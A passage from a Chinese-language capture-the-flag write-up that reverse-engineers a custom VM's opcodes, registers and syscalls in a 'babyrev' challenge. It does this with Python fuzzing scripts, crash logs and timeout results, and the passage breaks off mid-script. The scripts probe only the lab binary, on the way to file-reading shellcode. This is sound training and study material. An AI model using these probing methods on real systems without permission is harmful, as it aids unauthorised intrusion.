?<br>Machine CRASHED due to: unknown register<br>314004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> STK ? b<br><span class="hljs-comment">[s]</span> ... pushing b<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>318004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> STK ? i<br><span class="hljs-comment">[s]</span> ... pushing i<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310110 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> LDM ? = *c<br>Machine CRASHED due to: unknown register<br>310210 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> LDM ? = *s<br>Machine CRASHED due to: unknown register<br>310410 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> LDM ? = *a<br>Machine CRASHED due to: unknown register<br>310810 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> LDM ? = *f<br>Machine CRASHED due to: unknown register<br>311010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> LDM ? = *d<br>Machine CRASHED due to: unknown register<br>312010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> LDM ? = *?<br>Machine CRASHED due to: unknown register<br>314010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> LDM ? = *b<br>Machine CRASHED due to: unknown register<br>318010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> LDM ? = *i<br>Machine CRASHED due to: unknown register<br>312020 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x20 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> SYS 0x31 ?<br><span class="hljs-comment">[s]</span> ... <span class="hljs-keyword">open</span><br>Machine CRASHED due to: unknown register<br>310140 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> STM *? = c<br>Machine CRASHED due to: unknown register<br>310240 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> STM *? = s<br>Machine CRASHED due to: unknown register<br>310440 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> STM *? = a<br>Machine CRASHED due to: unknown register<br>310840 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> STM *? = f<br>Machine CRASHED due to: unknown register<br>311040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> STM *? = d<br>Machine CRASHED due to: unknown register<br>312040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> STM *? = ?<br>Machine CRASHED due to: unknown register<br>314040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> STM *? = b<br>Machine CRASHED due to: unknown register<br>318040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> STM *? = i<br>Machine CRASHED due to: unknown register<br>310180 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> CMP ? c<br>Machine CRASHED due to: unknown register<br>310280 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> CMP ? s<br>Machine CRASHED due to: unknown register<br>310480 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> CMP ? a<br>Machine CRASHED due to: unknown register<br>310880 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> CMP ? f<br>Machine CRASHED due to: unknown register<br>311080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> CMP ? d<br>Machine CRASHED due to: unknown register<br>312080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> CMP ? ?<br>Machine CRASHED due to: unknown register<br>314080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> CMP ? b<br>Machine CRASHED due to: unknown register<br>318080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> CMP ? i<br>Machine CRASHED due to: unknown register<br></code></pre></td></tr></table></figure>

<p>根据观察，可以发现：IMM，ADD，STK，LDM，STM和CMP不会出现Timeout。SYS和JMP会出现超时， <strong>但是SYS open不会出现超时。</strong> </p>
<p>那么回推到level22.1：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">300101</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300101</span><br><span class="hljs-attribute">300201</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300201</span><br><span class="hljs-attribute">300401</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300401</span><br><span class="hljs-attribute">300801</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300801</span><br><span class="hljs-attribute">301001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">301001</span><br><span class="hljs-attribute">302001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">302001</span><br><span class="hljs-attribute">304001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">304001</span><br><span class="hljs-attribute">308001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">308001</span><br><span class="hljs-attribute">300120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300120</span><br><span class="hljs-attribute">300220</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300220</span><br><span class="hljs-attribute">300420</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300420</span><br><span class="hljs-attribute">300820</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300820</span><br><span class="hljs-attribute">301020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">301020</span><br><span class="hljs-attribute">302020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">302020</span><br><span class="hljs-attribute">304020</span><br><span class="hljs-attribute">308020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">308020</span><br></code></pre></td></tr></table></figure>

<p>能够确定，<code>01</code>是JMP指令，<code>20</code>是SYS指令。且<code>xx4020</code>是open syscall。</p>
<p>然后我们把arg1改成<code>0x00</code>后发现（timeout设置为1）：</p>
<p>对level22.0来说，JMP，STK和SYS都会超时7个。</p>
<p>对于level22.1来说，<code>01</code>，<code>80</code>会超时7个，<code>20</code>会超时8个。</p>
<blockquote>
<p><code>80</code>是STK指令</p>
</blockquote>
<p>把arg1改成<code>0x10</code>后发现：</p>
<p>对于level22.0来说，JMP和IMM都会超时8个，其余超时7个。</p>
<p>对于level22.1来说，<code>01</code>和<code>02</code>超时8个，其余超时7个。</p>
<blockquote>
<p><code>02</code>是IMM指令</p>
</blockquote>
<p>把arg1改成<code>0x20</code>后发现：</p>
<p>对于level22.0来说，JMP超时8个，SYS超时7个（open不超时），其余不超时。</p>
<p>对于level22.1来说，<code>01</code>和<code>02</code>超时8个，其余超时7个。</p>
<p>把arg1改成<code>0x40</code>后发现：</p>
<p>对于level22.0来说，SYS都不超因为是<code>exit</code>，JMP，IMM全超时，其余超时7个。</p>
<p>对于level22.1来说，opcode<code>20</code>和opcode<code>01</code>超时。其余都不超时。</p>
<p>把arg1改成<code>0x01</code>后发现：</p>
<p>对于level22.1来说，SYS都不超时，JMP和IMM超时8个。其余超时7个，因此结合0x40参数来说，可以确定0x01是exit参数。随后可以使用imm + exit来确定i寄存器的位置。超时说明imm赋值了i寄存器，导致控制流改变，没有正确退出。得出<code>i</code>为<code>08</code></p>
<p>总结一下：</p>
<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">JMP</span>: 01<br><span class="hljs-attribute">IMM</span>: 02<br><span class="hljs-attribute">SYS</span>: 20		|	open:40		exit:01<br><span class="hljs-attribute">STK</span>: 80<br><span class="hljs-attribute">STM</span>: ?<br><span class="hljs-attribute">LDM</span>: ?<br><span class="hljs-attribute">ADD</span>: ?<br><span class="hljs-attribute">CMP</span>: ?<br><span class="hljs-literal">-</span>------------------------------------<br><span class="hljs-attribute">a</span>: ?<br><span class="hljs-attribute">b</span>: ?<br><span class="hljs-attribute">c</span>: ?<br><span class="hljs-attribute">d</span>: ?<br><span class="hljs-attribute">s</span>: ?<br><span class="hljs-attribute">i</span>: 08<br><span class="hljs-attribute">f</span>: ?<br></code></pre></td></tr></table></figure>

<p>到这儿以后，根据之前的shellcode发现，指令这块儿只拿到<code>STM</code>就够了。那么如何让STM在<code>LDM,ADD,CMP</code>中脱颖而出呢？依然是改变<code>i</code>寄存器的值，只要这个改变，那么控制流就会改变。而ADD和LDM都会改变i的值，因此会超时。</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-title">command</span>= [&#x27;/challenge/babyrev-level-<span class="hljs-number">22</span>-<span class="hljs-number">1</span>&#x27;]<br><br><span class="hljs-class"><span class="hljs-keyword">data</span> = bytearray()</span><br><br><span class="hljs-meta"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-meta">#     file.write(&#x27;&#x27;)</span><br><br><span class="hljs-title">values</span> = [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x40</span>]<br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x30</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> reg0x1 = 0x30</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x08</span>) # i寄存器</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>) # 0x1寄存器</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">i</span>) # 依次改成04 08 10 40测试即可</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br>    print(<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>    try:<br>        res = subprocess.run(command,input=<span class="hljs-class"><span class="hljs-keyword">data</span>,stdout=subprocess.<span class="hljs-type">PIPE</span>, stderr=subprocess.<span class="hljs-type">PIPE</span>,timeout=1)</span><br>    except subprocess.<span class="hljs-type">TimeoutExpired</span>:<br>            print(<span class="hljs-string">&quot;timeout&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.clear()</span><br></code></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">013002080104010120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">013002080104010120</span><br><span class="hljs-attribute">013002080108010120</span><br><span class="hljs-attribute">013002080110010120</span><br><span class="hljs-attribute">013002080140010120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">013002080140010120</span><br></code></pre></td></tr></table></figure>

<p>因此，可以判断出ADD指令和LDM指令在<code>0x04</code>和<code>0x40</code>中。而STM指令和CMP指令在<code>0x08</code>和<code>0x10</code>中。</p>
<p>进一步区STM和CMP指令需要借助JMP指令。因为CMP+JMP指令会导致跳转，从而超时。但是STM+JMP指令不会导致跳转。所以，CMP+JMP测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-1&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-comment"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-comment">#     file.write(&#x27;&#x27;)</span><br><br>values = [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>]<br>values_2 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values_2:<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x30</span>)<br>        data.append(<span class="hljs-number">0x02</span>)   <span class="hljs-comment"># IMM reg0x1 = 0x30</span><br><br>        data.append(<span class="hljs-number">0x08</span>) <span class="hljs-comment"># arg1 i</span><br>        data.append(<span class="hljs-number">0x08</span>) <span class="hljs-comment"># arg2 i</span><br>        data.append(i) <span class="hljs-comment"># CMP/STM i i</span><br>        data.append(j)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.clear()<br></code></pre></td></tr></table></figure>

<p>这里对于JMP指令的参数是不知道的，因此也需要循环遍历。所以是双重循环。最后结果如下：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@reverse</span>-engineering~level22<span class="hljs-number">-1</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>python vm.py <br><span class="hljs-number">013002080808010101010120</span><br><span class="hljs-number">013002080808020101010120</span><br><span class="hljs-number">013002080808040101010120</span><br><span class="hljs-number">013002080808080101010120</span><br><span class="hljs-number">013002080808100101010120</span><br><span class="hljs-number">013002080808200101010120</span><br><span class="hljs-number">013002080808400101010120</span><br><span class="hljs-number">013002080808800101010120</span><br><span class="hljs-number">013002080810010101010120</span><br><span class="hljs-number">013002080810020101010120</span><br><span class="hljs-number">013002080810040101010120</span><br><span class="hljs-number">013002080810080101010120</span><br><span class="hljs-number">013002080810100101010120</span><br><span class="hljs-number">013002080810200101010120</span><br><span class="hljs-number">013002080810400101010120</span><br>timeout <span class="hljs-number">013002080810400101010120</span><br><span class="hljs-number">013002080810800101010120</span><br></code></pre></td></tr></table></figure>

<p>因此，确定到<code>080810</code>中<code>10</code>是CMP指令。则<code>08</code>是STM指令的opcode。最后总结一下：</p>
<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">JMP</span>: 01<br><span class="hljs-attribute">IMM</span>: 02<br><span class="hljs-attribute">SYS</span>: 20		|	open:40		exit:01<br><span class="hljs-attribute">STK</span>: 80<br><span class="hljs-attribute">STM</span>: 08<br><span class="hljs-attribute">LDM</span>: 04|40<br><span class="hljs-attribute">ADD</span>: 04|40<br><span class="hljs-attribute">CMP</span>: 10<br><span class="hljs-literal">-</span>------------------------------------<br><span class="hljs-attribute">a</span>: ?<br><span class="hljs-attribute">b</span>: ?<br><span class="hljs-attribute">c</span>: ?<br><span class="hljs-attribute">d</span>: ?<br><span class="hljs-attribute">s</span>: ?<br><span class="hljs-attribute">i</span>: 08<br><span class="hljs-attribute">f</span>: ?<br></code></pre></td></tr></table></figure>

<p>接下来通过SYS sleep来确定reg_a，因为SYS sleep会休眠reg_a秒。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-1&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-comment"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-comment">#     file.write(&#x27;&#x27;)</span><br><br>values = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x80</span>]<br>values_2 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values_2:<br>        data.append(j)<br>        data.append(<span class="hljs-number">0x10</span>)<br>        data.append(<span class="hljs-number">0x02</span>)   <span class="hljs-comment"># IMM reg j = 0x10</span><br>        <br>        data.append(i)<br>        data.append(<span class="hljs-number">0x1</span>)      <span class="hljs-comment"># sleep | write | read_code | read_mem</span><br>        data.append(<span class="hljs-number">0x20</span>)<br><br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.clear()<br></code></pre></td></tr></table></figure>

<p>结果为：<code>timeout 101002020120010120</code>。那么可以知道<code>0x10</code>为reg_a，且sleep的code为<code>0x02</code>。再次汇总：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">JMP:</span> <span class="hljs-number">01</span><br><span class="hljs-symbol">IMM:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">SYS:</span> <span class="hljs-number">20</span>		|	open:<span class="hljs-number">40</span>		exit:<span class="hljs-number">01</span>		<span class="hljs-keyword">sleep</span>:<span class="hljs-number">02</span><br><span class="hljs-symbol">STK:</span> <span class="hljs-number">80</span><br><span class="hljs-symbol">STM:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">LDM:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">ADD:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">CMP:</span> <span class="hljs-number">10</span><br>-------------------------------------<br><span class="hljs-symbol">a:</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">b:</span> ?<br><span class="hljs-symbol">c:</span> ?<br><span class="hljs-symbol">d:</span> ?<br><span class="hljs-symbol">s:</span> ?<br><span class="hljs-symbol">i:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">f:</span> ?<br></code></pre></td></tr></table></figure>

<p>接下来可以确定write，因为可以将rax置为<code>0x1</code>这样就会输出在屏幕中了，因此我们可以遍历rcx，因为rcx控制的是输出字符数量，再遍历<code>read | write | read_code</code>。</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-title">command</span>= [&#x27;/challenge/babyrev-level-<span class="hljs-number">22</span>-<span class="hljs-number">1</span>&#x27;]<br><span class="hljs-class"><span class="hljs-keyword">data</span> = bytearray()</span><br><br><span class="hljs-meta"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-meta">#     file.write(&#x27;&#x27;)</span><br><br><span class="hljs-title">values</span> = [<span class="hljs-number">0x4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-title">values_2</span> = [<span 